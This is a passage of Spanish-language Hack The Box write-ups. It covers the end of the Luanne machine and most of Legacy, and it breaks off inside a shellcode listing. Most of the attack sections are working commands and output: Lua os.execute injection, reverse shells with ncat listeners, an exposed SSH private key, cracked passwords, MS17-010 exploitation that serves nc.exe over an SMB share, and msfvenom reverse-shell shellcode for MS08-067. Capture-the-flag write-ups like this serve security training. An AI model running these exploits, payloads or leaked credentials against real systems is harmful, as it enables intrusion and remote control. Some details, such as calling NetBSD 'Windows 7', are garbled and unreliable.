/usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 83 seconds      Raw packets sent: 129915 (5. 716MB) | Rcvd: 2611 (104. 460KB)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p22,80,9001 10. 10. 10. 218 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-29 16:33 GMTNmap scan report for 10. 10. 10. 218Host is up (0. 27s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 0 (NetBSD 20190418-hpn13v14-lpk; protocol 2. 0)| ssh-hostkey: |  3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)|  521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)80/tcp  open http  nginx 1. 19. 0| http-robots. txt: 1 disallowed entry |_/weather|_http-server-header: nginx/1. 19. 0|_http-title: 401 Unauthorized| http-auth: | HTTP/1. 1 401 Unauthorized\x0D|_ Basic realm=. 9001/tcp open http  Medusa httpd 1. 12 (Supervisor process manager)|_http-title: Error response| http-auth: | HTTP/1. 1 401 Unauthorized\x0D|_ Basic realm=default|_http-server-header: Medusa/1. 12Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsdService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190. 40 secondsPodemos ver que nmap nos reporta dos rutas validas robots y weather. Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina Windows 7:       Puerto   Servicio   Versión         22   SSH   OpenSSH 8. 0       80   HTTP   nginx 1. 19. 0       9001   TOR-ORPORT   Medusa httpd 1. 12   EXPLOTACION #: Comenzamos usando whatweb, para determinar las tecnologias que esta usando el servicio web. ❯ whatweb http://10. 10. 10. 218http://10. 10. 10. 218 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[nginx/1. 19. 0], IP[10. 10. 10. 218], Title[401 Unauthorized], WWW-Authenticate[. ][Basic], nginx[1. 19. 0]La herramienta nos reporta unathorized, en otras palabras nos solicita credenciales. ❯ whatweb http://10. 10. 10. 218:9001http://10. 10. 10. 218:9001 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Medusa/1. 12], IP[10. 10. 10. 218], Title[Error response], WWW-Authenticate[default][Basic]Vamos a proceder Abrimos el servicio con el navegador y vemos que efectivamente nos solicita credenciales para ingresar y si intentamos usar credenciales por defecto no conseguimos ingresar.  Lo siguiente que haremos sera dirigirnos a la ruta que nmap nos reporto robots. txt y podemos ver que dentro la ruta weather esta desabilitada.  Ya que la ruta se reporta como desabilitada, vamos a suponer que existe y con wfuzz vamos a tratar de fuzear por archivos dentro de esa ruta. ❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt http://10. 10. 10. 218/weather/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 218/weather/FUZZTotal requests: 220560=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000007114:  200    1 L   12 W    90 Ch     forecast                                                       000015529:  404    7 L   11 W    153 Ch    hitb Despues de aplicar fuzzing, vemos que existe una ruta forecast que si la visualizamos tenemos acceso a una api json.  En el mensaje vemos que nos pide usar un paramatro, para poder listar las ciudades.  Como vemos que se estan usando parametros, vamos a pasar la petición por burpsuite para tratar de realizar inyecciones en la petición que nos permitan aprovecharnos de esta, asi que mandamos la petición con ayuda de foxyproxy.  Recibimos la petición en burpsuite y la mandamos al repeater.  Ahora trataremos de realizar una inyección en la petición incorporando una '.  Ocasionamos unluaerror, asi que podemos tratar de ejecutar un comando con lua, usando os. execute(). y comentando la query.  En principio, la inyección parece fallar, pero vamos a volver a enviarlo esta vez haciendo urlencode y esta vez si vemos la ejecución correctamente.  Lo siguiente que haremos sera entablarnos una revershell a nuestra maquina usando mkfifo para que si tenemos una versión distinta de ncat evitar inconenientes, para ello podemos usar la pagina web de confianza de pentestmonkey.  https://pentestmonkey. net/cheat-sheet/shells/reverse-shell-cheat-sheetEnviamos la petición, modificando nuestra ip, puerto en escucha y sin olvidar urlencodear la petición.  Y recibimos la conexión en nuestra maquina como el usuario httpd. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 218. Ncat: Connection from 10. 10. 10. 218:65479. sh: can't access tty; job control turned off$ whoami_httpd$ hostnameluanne. htb$ uname -a NetBSD luanne. htb 9. 0 NetBSD 9. 0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020 mkrepro@mkrepro. NetBSD. org:/usr/src/sys/arch/amd64/compile/GENERIC amd64Y vemos que si se corresponde a un NetBSD. Ahora vamos a lista los procesos que se estan ejecutando en la maquina y obervamos una correspondiente al demonio de httpd, por el puerto 3001 que apunta a la ruta weathersimilar a la que usamos para ganar acceso al sistema. curl -u -X -s -i  http://127. 0. 0. 1:3000/weather/forecast?city=list' Enter host password for user '-X':HTTP/1. 1 500 ErrorContent-Type: application/json&lt;br&gt;Lua error: /usr/local/webapi/weather. lua:49: attempt to call a nil valuecurl -u -X -s -i  http://127. 0. 0. 1:3000/weather/forecast?city=list'%29%3B+os. execute%28%22id%22%29--%2B- Enter host password for user '-X':HTTP/1. 1 500 ErrorContent-Type: application/json{ code : 500, error :  unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)curl -u -X -s -i  http://127. 0. 0. 1:3000/weather/forecast?city=list'%29%3B+os. execute%28%22whoami%22%29--%2B- Enter host password for user '-X':HTTP/1. 1 500 ErrorContent-Type: application/json{ code : 500, error :  unknown city: list_httpdObservamos que tambien podemos ejecutar comandos, pero como el mismo usuario, asi que no nos serviria hacerlo. Pero vemos que en la ejecución del comando incorpora distintos parametros y podemos ver a que corresponde en NETBSD. Encontramos un articulo que nos explica a detalle el funcionamiento de los parametros.  https://man. netbsd. org/NetBSD-9. 3/i386/httpd. 8Entre los parametros que se utiliza en la petición, podemos ver que -u, permite la transformación de localizadores uniformes de recursos de la forma /~user/ en el directorio ~user/public_html.  Ahora podemos aprovecharnos de esto, para lista los recursos del directorio r. michaels, pero como realiza una autenticación, necesitamos credenciales y si listamos los archivos ocultos de nuestro directorio actual, podemos ver un archivo de nombre . htpasswd que al leerlo se nos reporta un usuario con una contraeña hasheada que podemos intentar crackerla con john. ls -latotal 20drwxr-xr-x  2 root wheel 512 Nov 25 2020 . drwxr-xr-x 24 root wheel 512 Nov 24 2020 . . -rw-r--r--  1 root wheel  47 Sep 16 2020 . htpasswd-rw-r--r--  1 root wheel 386 Sep 17 2020 index. html-rw-r--r--  1 root wheel  78 Nov 25 2020 robots. txtcat . htpasswdwebapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0Despues de realizar el crackeo john, nos reporta la contraseña en texto claro, asi que ahora que contamos con credenciales validar webapi_user:iamthebest, podemos usarlas en la petición. curl -s -X GET  http://127. 0. 0. 1:3001/~r. michaels/  -u 'webapi_user:iamthebest'&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset= utf-8 /&gt;&lt;style type= text/css &gt;table {	border-top: 1px solid black;	border-bottom: 1px solid black;}th { background: aquamarine; }tr:nth-child(even) { background: lavender; }&lt;/style&gt;&lt;title&gt;Index of ~r. michaels/&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of ~r. michaels/&lt;/h1&gt;&lt;table cols=3&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align=right&gt;Size&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;a href= . . / &gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align=right&gt;1kB&lt;tr&gt;&lt;td&gt;&lt;a href= id_rsa &gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align=right&gt;3kB&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;Esta vez podemos listar el contenido del usuario r. michaels y dentro vemos su id_rsa. Ahora tal y como nos dice el articulo de NETBSD, podemos hacer uso del paramtro -G para ver el output. curl -s -X GET  http://127. 0. 0. 1:3001/~r. michaels/id_rsa  -u 'webapi_user:iamthebest' -G id_rsa-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----Ya con la id_rsa al estar abierto el puerto 22, podemos conectarnos como r. michaels, sin proporcionar contraseña. ❯ nvim id_rsa❯ chmod 600 id_rsa❯ ssh -i id_rsa r. michaels@10. 10. 10. 218The authenticity of host '10. 10. 10. 218 (10. 10. 10. 218)' can't be established. ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo. Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10. 10. 10. 218' (ECDSA) to the list of known hosts. Last login: Fri Sep 18 07:06:51 2020NetBSD 9. 0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020Welcome to NetBSD!luanne$ whoamir. michaelsVisualizamos los archivos, del directorio y podemos leer la primera flag user. txt. backups   devel    public_html user. txtluanne$ cat user. txt                                                                                 ea5f0ce6a917b0be1eabc7f9218febc0ELEVACION DE PRIVILEGIOS #: Si listamos el directorio del usuario, obsevamos un directorio backup, que dentro contiene un archivo tar encrpytado. luanne$ lsbackups   devel    public_html user. txtluanne$ cd backups/                                                                                  luanne$ ls devel_backup-2020-09-16. tar. gz. encAhora en NETBSD, existe una herramienta para decsencriptar estos archivos que corresponde ah netpgp. Si ejecutamos la herramienta nos muestra el panel de ayuda para poder ejecutarla correctamente. luanne$ netpgpNetPGP portable 3. 99. 17/[20101103]All bug reports, praise and chocolate, please, to:Alistair Crooks &lt;agc@netbsd. org&gt; c0596823Usage: netpgp COMMAND OPTIONS:netpgp --help OR    --encrypt [--output=file] [options] files. . . OR    --decrypt [--output=file] [options] files. . . OR    --sign [--armor] [--detach] [--hash=alg] [--output=file]        [options] files. . . OR    --verify [options] files. . . OR    --cat [--output=file] [options] files. . . OR    --clearsign [--output=file] [options] files. . . OR    --list-packets [options] OR    --versionwhere options are:    [--cipher=&lt;ciphername&gt;] AND/OR    [--coredumps] AND/OR    [--homedir=&lt;homedir&gt;] AND/OR    [--keyring=&lt;keyring&gt;] AND/OR    [--numtries=&lt;attempts&gt;] AND/OR    [--userid=&lt;userid&gt;] AND/OR    [--maxmemalloc=&lt;number of bytes&gt;] AND/OR    [--verbose]Despues de decsencriptar el archivo, vamos a traernoslo a nuestro equipo para descromprimirlo, como no cuenta con python, usaremos nc.  Lo descomprimimos y dentro vemos otro archivo . htpasswd. ❯ ls devel_backup-2020-09-16. tar. gz  id_rsa❯ file devel_backup-2020-09-16. tar. gzdevel_backup-2020-09-16. tar. gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288❯ tar -xf devel_backup-2020-09-16. tar. gz❯ ls devel-2020-09-16  devel_backup-2020-09-16. tar. gz  id_rsa❯ cd devel-2020-09-16❯ ls webapi  www❯ tree -fas. ├── [     22] . /webapi│   └── [    7072] . /webapi/weather. lua└── [     38] . /www  ├── [     47] . /www/. htpasswd  └── [    378] . /www/index. html2 directories, 3 filesAl leer el archivo, vemos una contraeña hasheada, pero que es distinta a la obtuvimos previamente. Asi con john vamos a intentar crackear este otro hash. ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hash2Warning: detected hash type  md5crypt , but the string is also recognized as  md5crypt-long Use the  --format=md5crypt-long  option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuslittlebear    (webapi_user)1g 0:00:00:00 DONE (2023-06-29 18:21) 7. 142g/s 93257p/s 93257c/s 93257C/s gamboa. . hello11Use the  --show  option to display all of the cracked passwords reliablySession completedObtenemos una nueva contraseña littlebear, que curiosamente corresponde a la del usuario root, pero para migrar no podemos hacer uso de su root, ya que en NETBSD lo hacemos usando el comando doas. luanne$ su root su: You are not listed in the correct secondary group (wheel) to su root. su: Sorry: Authentication errorluanne$ doas shPassword:# whoamirootFinalmente solo debemos dirigirnos al directorio personal del usuario root y visualizar la segunda flag root. txt y asi habriamos concluido. # cd /root# cat root. txt7a9b5c206e8e8ba09bb99bd113675f66"
    }, {
    "id": 22,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Legacy",
    "title": "Maquina Legacy - htb writeup",
    "body": "2023/06/29 - El dia de hoy vamos a resolver Legacy de hackthebox una maquina windows sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de eternal blue usando el zzz_exploit. py, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por smb donde se nos reprotara que el servicio es vulnerable a el exploit MS08_067 el cual tambien explotaremos a traves de la creación de un shellcode para asi obtener acceso como el usuario adminsitrator. Comenzaremos como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Legacy❯ ls LegacySeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 4PING 10. 10. 10. 4 (10. 10. 10. 4) 56(84) bytes of data. 64 bytes from 10. 10. 10. 4: icmp_seq=1 ttl=127 time=119 ms--- 10. 10. 10. 4 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 118. 571/118. 571/118. 571/0. 000 msVemos que la maquina nos responde, con un ttl de 127 correspondiente a una maquina windows. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 4 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-29 18:54 GMTInitiating SYN Stealth Scan at 18:54Scanning 10. 10. 10. 4 [65535 ports]Discovered open port 139/tcp on 10. 10. 10. 4Discovered open port 445/tcp on 10. 10. 10. 4Discovered open port 135/tcp on 10. 10. 10. 4Completed SYN Stealth Scan at 18:55, 21. 64s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 4Host is up, received user-set (0. 18s latency). Scanned at 2023-06-29 18:54:52 GMT for 21sNot shown: 56233 closed tcp ports (reset), 9299 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT  STATE SERVICE   REASON135/tcp open msrpc    syn-ack ttl 127139/tcp open netbios-ssn syn-ack ttl 127445/tcp open microsoft-ds syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 21. 77 seconds      Raw packets sent: 106649 (4. 693MB) | Rcvd: 65813 (2. 633MB)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p135,139,445 10. 10. 10. 4 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-29 18:56 GMTNmap scan report for 10. 10. 10. 4Host is up (0. 18s latency). PORT  STATE SERVICE   VERSION135/tcp open msrpc    Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows XP microsoft-dsService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_smb2-time: Protocol negotiation failed (SMB2)|_clock-skew: mean: 5d00h27m34s, deviation: 2h07m16s, median: 4d22h57m34s| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:a9:4a (VMware)| smb-os-discovery: |  OS: Windows XP (Windows 2000 LAN Manager)|  OS CPE: cpe:/o:microsoft:windows_xp::-|  Computer name: legacy|  NetBIOS computer name: LEGACY\x00|  Workgroup: HTB\x00|_ System time: 2023-07-04T23:53:50+03:00Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19. 17 secondsVisulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina Windows XP:       Puerto   Servicio   Versión         135   RPC   Microsoft Windows RPC       139   LDAP   Microsoft Windows netbios-ssn       445   SMB   Windows XP microsoft-ds   EXPLOTACION #: Como vemos que la maquina corresponde Windows XP, podemos explotar el eternal blue, asi que vamos a explotarlo usando el exploit de github de warawit.  https://github. com/worawit/MS17-010Descargamos al repositorio y ejecutamos el checker. py, para encontrar named pipes vulnerables.  Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor. Ejectamos el checker. py el cual nos reporta dos named pipes de los que podemos abusar. ❯ python2 checker. py 10. 10. 10. 4Target OS: Windows 5. 1The target is not patched=== Testing named pipes ===spoolss: Ok (32 bit)samr: STATUS_ACCESS_DENIEDnetlogon: STATUS_ACCESS_DENIEDlsarpc: STATUS_ACCESS_DENIEDbrowser: Ok (32 bit)Ahora nos abriremos el zzz_exploit. py, para modificar la instrucción que queremos ejecutar al lanzar el exploit, en la que nos montaremos un recurso compartido en nuestra maquina donde alojaremos el nc. exe el cual se ejecutara otorgandonos una conexión a nuestra maquina. Esto descomentado la opción service_exec y comentaremos las lineas previas.  Para ello, podemos descarganos el ejecutable de nc, para ello iremos al siguiente enlace y descargaremos el correspondiente a la versión 1. 12.  Netcat Si optamos por descargarlo de esta manera obtendremos un comprimido, el cual debemos descomprimirlo en una carpeta aparte ya que este contiene muchos archivos. En mi caso yo usare el nc. exe que contempla el repositorio de danil miesler.  SecLists❯ cp /opt/SecLists/Miscellaneous/web/http-request-headers/nc. exe . ❯ ls MS17-010  nc. exe  netcat-win32-1. 12. zipProcedemos a montar nuestro recurso compartido, donde alojaremos el nc. exe. ❯ impacket-smbserver smbFolder $(pwd) -smb2supportImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsedNos ponemos en escucha con ncat por el puerto que configuramos, en este caso el correspondiente a el 443. ELEVACION DE PRIVILEGIOS #: Ejecutamos el zzz_exploit. py junto con el named pipe que previamente nos reporto el checker. py. ❯ python2 zzz_exploit. py 10. 10. 10. 4 spoolssTarget OS: Windows 5. 1Groom packetsattempt controlling next transaction on x86success controlling one transactionmodify parameter count to 0xffffffff to be able to write backwardleak next transactionCONNECTION: 0x86101b30SESSION: 0xe1b1cc68FLINK: 0x7bd48InData: 0x7ae28MID: 0xaTRANS1: 0x78b50y recibimos la conexión. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 4. Ncat: Connection from 10. 10. 10. 4:1046. Microsoft Windows XP [Version 5. 1. 2600](C) Copyright 1985-2001 Microsoft Corp. C:\WINDOWS\system32&gt;Ahora podemos ir al directorio del usuario john y visualizar la primera flag user. txt. C:\Documents and Settings\john\Desktop&gt;dirdir Volume in drive C has no label. Volume Serial Number is 54BF-723B Directory of C:\Documents and Settings\john\Desktop16/03/2017 09:19   &lt;DIR&gt;     . 16/03/2017 09:19   &lt;DIR&gt;     . . 16/03/2017 09:19         32 user. txt        1 File(s)       32 bytes        2 Dir(s)  6. 342. 070. 272 bytes freeC:\Documents and Settings\john\Desktop&gt;type user. txttype user. txte69af0e4f443de7e36876fda4ec7644fEXPLOTACION ALTERNA #: Ahora para comprometer la maquina de una manera alternativa, primero usaremos los scripts smb-vuln\* de nmap en el puerto 445. QUITTING!❯ nmap --script smb-vuln\* -p445 10. 10. 10. 4 -oN smbScanStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-29 19:55 GMTNmap scan report for 10. 10. 10. 4Host is up (0. 12s latency). PORT  STATE SERVICE445/tcp open microsoft-dsHost script results:|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)|_smb-vuln-ms10-054: false| smb-vuln-ms08-067: |  VULNERABLE:|  Microsoft Windows system vulnerable to remote code execution (MS08-067)|   State: VULNERABLE|   IDs: CVE:CVE-2008-4250|      The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,|      Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary|      code via a crafted RPC request that triggers the overflow during path canonicalization. |      |   Disclosure date: 2008-10-23|   References:|    https://technet. microsoft. com/en-us/library/security/ms08-067. aspx|_   https://cve. mitre. org/cgi-bin/cvename. cgi?name=CVE-2008-4250Nmap done: 1 IP address (1 host up) scanned in 9. 88 secondsNmap nos reporta que el servicio es vulnerable a ms08-067 ya que corresponde a un Windows XP. Para poder explotarla vamos a descargarnos un exploit de andyacer de github:  https://github. com/andyacer/ms08_067Ahi nos explican a fondo en que consiste la explotación y nos pide que generemos un shellcode el cual debemos ingresar al exploit. Para ello vamos a generar el shellcode usando msfvenom, si no sabes como en el repositorio te explica como debemos hacerlo exactamente, solo debemos especificar nuestra ip y el puerto. ❯ msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 16. 3 LPORT=443 EXITFUNC=thread -b  \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40  -f c -a x86 --platform windowsFound 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai failed with A valid opcode permutation could not be found. Attempting to encode payload with 1 iterations of generic/nonegeneric/none failed with Encoding failed due to a bad character (index=3, char=0x00)Attempting to encode payload with 1 iterations of x86/call4_dword_xorx86/call4_dword_xor succeeded with size 348 (iteration=0)x86/call4_dword_xor chosen with final size 348Payload size: 348 bytesFinal size of c file: 1491 bytesunsigned char buf[] =  \x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76  \x0e\x63\xc8\xc3\x99\x83\xee\xfc\xe2\xf4\x9f\x20\x41\x99  \x63\xc8\xa3\x10\x86\xf9\x03\xfd\xe8\x98\xf3\x12\x31\xc4  \x48\xcb\x77\x43\xb1\xb1\x6c\x7f\x89\xbf\x52\x37\x6f\xa5  \x02\xb4\xc1\xb5\x43\x09\x0c\x94\x62\x0f\x21\x6b\x31\x9f  \x48\xcb\x73\x43\x89\xa5\xe8\x84\xd2\xe1\x80\x80\xc2\x48  \x32\x43\x9a\xb9\x62\x1b\x48\xd0\x7b\x2b\xf9\xd0\xe8\xfc  \x48\x98\xb5\xf9\x3c\x35\xa2\x07\xce\x98\xa4\xf0\x23\xec  \x95\xcb\xbe\x61\x58\xb5\xe7\xec\x87\x90\x48\xc1\x47\xc9  \x10\xff\xe8\xc4\x88\x12\x3b\xd4\xc2\x4a\xe8\xcc\x48\x98  \xb3\x41\x87\xbd\x47\x93\x98\xf8\x3a\x92\x92\x66\x83\x97  \x9c\xc3\xe8\xda\x28\x14\x3e\xa0\xf0\xab\x63\xc8\xab\xee  \x10\xfa\x9c\xcd\x0b\x84\xb4\xbf\x64\x37\x16\x21\xf3\xc9  \xc3\x99\x4a\x0c\x97\xc9\x0b\xe1\x43\xf2\x63\x37\x16\xc9  \x33\x98\x93\xd9\x33\x88\x93\xf1\x89\xc7\x1c\x79\x9c\x1d  \x54\xf3\x66\xa0\xc9\x93\x73\xcb\xab\x9b\x63\xc9\x78\x10  \x85\xa2\xd3\xcf\x34\xa0\x5a\x3c\x17\xa9\x3c\x4c\xe6\x08  \xb7\x95\x9c\x86\xcb\xec\x8f\xa0\x33\x2c\xc1\x9e\x3c\x4c  \x0b\xab\xae\xfd\x63\x41\x20\xce\x34\x9f\xf2\x6f\x09\xda  